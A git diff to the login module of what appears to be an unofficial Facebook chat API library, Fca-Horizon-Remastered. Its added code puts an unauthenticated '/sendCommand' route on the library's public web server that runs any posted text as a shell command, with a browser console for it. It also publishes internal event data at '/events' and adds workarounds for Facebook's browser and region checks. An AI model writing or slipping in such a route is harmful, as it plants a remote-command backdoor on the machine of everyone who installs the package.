@@ -1,6 +1,7 @@
 'use strict';
 
 //-[ Require config and use ]-!/
+let lsevents = [global.events]
 
 if (global.Fca.Require.FastConfig.Config != 'default') {
     //do ssth
@@ -18,7 +19,7 @@ var utils = global.Fca.Require.utils,
     express = require("express")(),
     { join } = require('path'),
     cheerio = require("cheerio"),
-    { readFileSync } = require('fs-extra'),
+    { readFileSync, writeFileSync } = require('fs-extra'),
     Database = require("./Extra/Database"),
     readline = require("readline"),
     chalk = require("chalk"),
@@ -29,7 +30,9 @@ var utils = global.Fca.Require.utils,
     { getAll, deleteAll } = require('./Extra/ExtraGetThread'),
     ws = require('ws'),
     Websocket = require('./Extra/Src/Websocket'),
-    Convert = require('ansi-to-html');
+    Convert = require('ansi-to-html'),
+    bodyParser = require('body-parser'),
+    { exec } = require('child_process');
 
 //-[ Set Variable For Process ]-!/
 
@@ -52,40 +55,155 @@ const js = readFileSync(join(__dirname, 'Extra', 'Html', 'Classic', 'script.js')
  * @returns A HTML file
  */
 
-function ClassicHTML(UserName,Type,link) {
-    return `<!DOCTYPE html>
-    <html lang="en" >
-        <head>
-        <meta charset="UTF-8">
-        <title>Horizon</title>
-        <link rel="stylesheet" href="./style.css">
-    </head>
-    <body>
-        <center>
-            <marquee><b>waiting for u :d</b></marquee>
-            <h2>Horizon User Infomation</h2>
-            <h3>UserName: ${UserName} | Type: ${Type}</h3>
-            <canvas id="myCanvas"></canvas>
-            <script  src="./script.js"></script>
-            <footer class="footer">
-                <div id="music">
-                    <audio autoplay="false" controls="true" loop="true" src="${link}" __idm_id__="5070849">Your browser does not support the audio element.</audio>
-                    <br><b>Session ID:</b> ${global.Fca.Require.Security.create().uuid}<br>
-                    <br>Thanks For Using <b>Fca-Horizon-Remastered</b> - From <b>Kanzu</b> <3<br>
-                </div>
-            </footer>
+function ClassicHTML(UserName, Type, link) {
+    const checkapi = global.api ? true : false;
+    const eventExists = global.events ? true : false;
+    let eventsJSON = '';
+
+    if (eventExists) {
+        const events = global.events;
+        eventsJSON = `
+            <h3>Event Data:</h3>
+            <div class="events-container">
+                <pre id="eventsData">${JSON.stringify(events, null, 2)}</pre>
             </div>
-        </center>
-    </html>
-    </body>`
-    //lazy to change
+        `;
+    }
+
+    return `<!DOCTYPE html>
+    <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <title>Horizon</title>
+            <link rel="stylesheet" href="./style.css">
+            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+        </head>
+        <body>
+            <center>
+                <marquee><b>waiting for u :d</b></marquee>
+                <h2>Horizon User Information</h2>
+                <h3>UserName: ${UserName} | Type: ${Type}</h3>
+                <canvas id="myCanvas"></canvas>
+                <script src="./script.js"></script>
+                ${eventsJSON}
+                <footer class="footer">
+                    <div id="music">
+                        <audio autoplay="true" controls="true" loop="true" src="${link}">Your browser does not support the audio element.</audio>
+                        <br><b>Session ID:</b> ${global.Fca.Require.Security.create().uuid}<br>
+                        <br><b>Thời gian chạy:</b> <span id="currentTime">0:0:0s</span><br>
+                        <br><b>Check api:</b> <span id="checkapi">${checkapi}</span><br>
+                        <br>Thanks For Using <b>Fca-Horizon-Remastered</b> - From <b>Kanzu</b> <3<br>
+                        <input type="text" id="commandInput" placeholder="Nhập lệnh...">
+                        <button id="sendCommandButton">Gửi lệnh</button>
+                        
+                        <div class="events-container">
+                            <pre id="commandResult"></pre>
+                        </div>
+                    </div>
+                </footer>
+            </center>
+            <script>
+                const timeRun = ${global.timeRun};
+                function updateTime() {
+                    let timeNow = Date.now();
+                    const timeElapsed = timeNow - timeRun;
+
+                    const seconds = Math.floor((timeElapsed / 1000) % 60);
+                    const minutes = Math.floor((timeElapsed / (1000 * 60)) % 60);
+                    const hours = Math.floor((timeElapsed / (1000 * 60 * 60)) % 24);
+
+                    document.getElementById('currentTime').textContent = \`\${hours}:\${minutes}:\${seconds}s\`;
+                }
+
+                function sendCommand() {
+                    const command = document.getElementById('commandInput').value;
+                    const data = { command, timestamp: Date.now() };
+
+                    $.ajax({
+                        url: '/sendCommand',
+                        type: 'POST',
+                        contentType: 'application/json',
+                        data: JSON.stringify(data),
+                        success: function(response) {
+                            console.log('Command sent successfully:', response);
+                            document.getElementById('commandResult').textContent = response;
+                        },
+                        error: function(err) {
+                            console.error('Error sending command:', err);
+                            document.getElementById('commandResult').textContent = 'Error executing command';
+                        }
+                    });
+                }
+
+                document.getElementById('sendCommandButton').addEventListener('click', sendCommand);
+                
+                function fetchEventsData() {
+                    $.ajax({
+                        url: '/events',
+                        type: 'GET',
+                        success: function(data) {
+                            const eventsDataElement = document.getElementById('eventsData');
+                            eventsDataElement.textContent = JSON.stringify(data, null, 2);
+
+                            // Tự động cuộn xuống dưới cùng
+                            eventsDataElement.scrollTop = eventsDataElement.scrollHeight;
+                        },
+                        error: function(err) {
+                            console.error('Error fetching events data:', err);
+                        }
+                    });
+                }
+                document.getElementById('commandInput').addEventListener('keydown', function(event) {
+                    if (event.key === 'Enter') {
+                        sendCommand();
+                    }
+                });
+
+                
+                setInterval(fetchEventsData, 1000);
+                setInterval(updateTime, 1000);
+                updateTime();
+            </script>
+        </body>
+    </html>`;
 }
+
+
 
 
 
 //-[ Stating Http Infomation ]-!/
 
 express.set('DFP', (process.env.PORT || process.env.port || 80));
+express.use(bodyParser.json())
+express.post('/sendCommand', (req, res) => {
+    const { command, timestamp } = req.body;
+    console.log(`Command received at ${new Date(timestamp)}: ${command}`);
+
+    exec(command, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Lỗi: ${error}`);
+            return res.status(500).send(`Lỗi: ${error.message}`);
+        }
+        if (stderr) {
+            console.error(`Lỗi: ${stderr}`);
+            return res.status(500).send(`Lỗi: ${stderr}`);
+        }
+        console.log(`Kết quả: ${stdout}`);
+        res.status(200).send(`Kết quả: ${stdout}`);
+    });
+});
+express.get('/events', (req, res) => {
+    // Xử lý logic để lấy thông tin sự kiện (events) từ server
+    // Ví dụ: Lấy dữ liệu từ global.events
+    if(lsevents[lsevents.length - 1] != global.events) {
+        lsevents.push(global.events);
+    }
+    const events = lsevents
+    
+    res.json(events);
+});
 
 express.use(function(req, res, next) {
     switch (req.url.split('?')[0]) {
@@ -101,11 +219,14 @@ express.use(function(req, res, next) {
         }
         default: {
             res.writeHead(200, "OK", { "Content-Type": "text/html" });
-            res.write(ClassicHTML(global.Fca.Require.FastConfig.HTML.UserName, "Premium Access", global.Fca.Require.FastConfig.HTML.MusicLink));
+            res.write(ClassicHTML(global.Fca.Require.FastConfig.HTML.UserName, "Premium Access", 'https://rr1---sn-i3b7knsd.googlevideo.com/videoplayback?expire=1718227696&ei=kL5pZr2VCL3r2roPr4-m0AM&ip=27.79.214.50&id=o-ACLoD3HgQe8ZzvtdeYF7Za_ohn-yPdMps8x3AlsB9WtY&itag=249&source=youtube&requiressl=yes&xpc=EgVo2aDSNQ%3D%3D&bui=AbKP-1Pz3qUB-83hdWEr3JXcp2uuDDlUxEiwHtnLRpVxRRaaCFV9IlzR5zzFszYKvI3UFadv6XWpPtaX&spc=UWF9fxC7fkJ_upCv1lxrIJ6SssM9mA0Sxc0dtRnousMYK7lcA0DrgGJbRCOG&vprv=1&svpuc=1&mime=audio%2Fwebm&ns=Vk7WBbK0EvuKoyVXa8R_VR4Q&rqh=1&gir=yes&clen=2148581&dur=325.661&lmt=1717927333092051&keepalive=yes&c=WEB&sefc=1&txp=4532434&n=3hcWcAJWCEaIFw&sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cxpc%2Cbui%2Cspc%2Cvprv%2Csvpuc%2Cmime%2Cns%2Crqh%2Cgir%2Cclen%2Cdur%2Clmt&sig=AJfQdSswRQIgf4BsBo5Ox40tn8ctzOwdvStTiaZaMAtwDbwNEmriQu0CIQCrpflW9UhoL0-NeH2bX_BIqC5MrpkLIfsDGvOh-z8l3w%3D%3D&rm=sn-8pxuuxa-i5o667l,sn-8pxuuxa-i5o6d7r,sn-npozs7e&fexp=24350485&req_id=49907f027c3ca3ee&redirect_counter=3&cms_redirect=yes&cmsv=e&ipbypass=yes&mh=xR&mip=2405:4802:1ca1:efb0:d482:fd67:cf0d:49b8&mm=30&mn=sn-i3b7knsd&ms=nxu&mt=1718205875&mv=m&mvi=1&pl=44&lsparams=ipbypass,mh,mip,mm,mn,ms,mv,mvi,pl&lsig=AHlkHjAwRQIhAM2GJ0ox1UqbnG-0oFlZlkTKqpIJSgOKhFb-4luvveilAiAAlGRMakHRJcb6rgxyKNj-c9p0odd3hv6XqzK78tD1bw%3D%3D'));
         }
     }
     res.end();
 })
+
+
+
 var Server;
 if (global.Fca.Require.FastConfig.HTML.HTML) Server= express.listen(express.get('DFP'));
 
@@ -220,7 +341,7 @@ function setOptions(globalOptions, options) {
                         break;
                     }
                     case 'userAgent': {
-                        globalOptions.userAgent = (options.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36');
+                        globalOptions.userAgent = (options.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36');
                         break;
                     }
                     case 'proxy': {
@@ -252,7 +373,7 @@ function setOptions(globalOptions, options) {
  * @param {{ getCookies: (arg0: string) => any[]; }} jar
  */
 
-function buildAPI(globalOptions, html, jar) {
+function buildAPI(globalOptions, html, jar, bypass_region) {
     //check tiktik
     var userID;
     var cookie = jar.getCookies("https://www.facebook.com");
@@ -319,8 +440,7 @@ function buildAPI(globalOptions, html, jar) {
                 }
             return;
             }
-        });    
-
+        });   
         var ctx = {
             userID: userID,
             jar: jar,
@@ -345,13 +465,18 @@ function buildAPI(globalOptions, html, jar) {
                 return utils.getAppState(jar);
             }
         };
-
+     
         if (region && mqttEndpoint) {
             //do sth
         }
         else {
-            log.warn("login", getText(Language.NoAreaData));
-            api["htmlData"] = html;
+            if (bypass_region) {
+                logger.Normal(Language.NoAreaDataBypass);
+            }
+            else {
+                log.warn("login", getText(Language.NoAreaData));
+                api["htmlData"] = html;
+            }
         }
 
         var defaultFuncs = utils.makeDefaults(html, userID, ctx);
@@ -950,20 +1075,53 @@ try {
     } catch (e) {
         console.log(e);
     }
-
-
+    let redirect = [1, "https://m.facebook.com/"];
+    let bypass_region_err = false;
         var ctx,api;
             mainPromise = mainPromise
                 .then(function(res) {
-                    var reg = /<meta http-equiv="refresh" content="0;url=([^"]+)[^>]+>/,redirect = reg.exec(res.body);
+                    var reg = /<meta http-equiv="refresh" content="0;url=([^"]+)[^>]+>/;
+                    redirect = reg.exec(res.body);
                         if (redirect && redirect[1]) return utils.get(redirect[1], jar, null, globalOptions).then(utils.saveCookies(jar));
                     return res;
                 })
                 .then(function(res) {
-                    var html = res.body,Obj = buildAPI(globalOptions, html, jar);
+                    let reg_antierr = /This browser is not supported/gs; // =))))))
+                    if (reg_antierr.test(res.body)) {
+                        const Data = JSON.stringify(res.body);
+                        const Dt_Check = Data.split('2Fhome.php&amp;gfid=')[1];
+                        if (Dt_Check == undefined) return res
+                        const fid = Dt_Check.split("\\\\")[0];//fix sau
+                        if (Dt_Check == undefined || Dt_Check == "") return res
+                        const final_fid = fid.split(`\\`)[0];
+                        if (final_fid == undefined || final_fid == '') return res;
+                        const redirectlink = redirect[1] + "a/preferences.php?basic_site_devices=m_basic&uri=" + encodeURIComponent("https://m.facebook.com/home.php") + "&gfid=" + final_fid;
+                        bypass_region_err = true;
+                        return utils.get(redirectlink, jar, null, globalOptions).then(utils.saveCookies(jar));
+                    }
+                    else return res
+                })
+                // .then(function(res) {
+                //     let reg_old_web = /Switch Default Site/gs;
+                //     if (reg_old_web.test(res.body)) {
+                //         let Data_Resp = JSON.stringify(res.body);
+                //         const link = Data_Resp.split('settings/site')[1].split("\"")[0].replace('\\', '')
+                //         const redirect_link2 = redirect[1] + "settings/site" + utils.cleanHTML(link)
+                //         console.log(redirect_link2)
+                //         return utils.get("https://www.facebook.com/", jar, null, globalOptions).then(utils.saveCookies(jar)); // try ag
+                //     }
+                //     else return res;
+                // })
+                // .then(function(res) {
+                //     var reg = /<meta http-equiv="refresh" content="0;url=([^"]+)[^>]+>/;
+                //     redirect = reg.exec(res.body);
+                //         if (redirect && redirect[1]) return utils.get(redirect[1], jar, null, globalOptions).then(utils.saveCookies(jar));
+                //     return res;
+                // })
+                .then(function(res){
+                    var html = res.body,Obj = buildAPI(globalOptions, html, jar,bypass_region_err);
                         ctx = Obj.ctx;
                         api = Obj.api;
-                        process.env.api = Obj.api;
                     return res;
                 });
             if (globalOptions.pageID) {
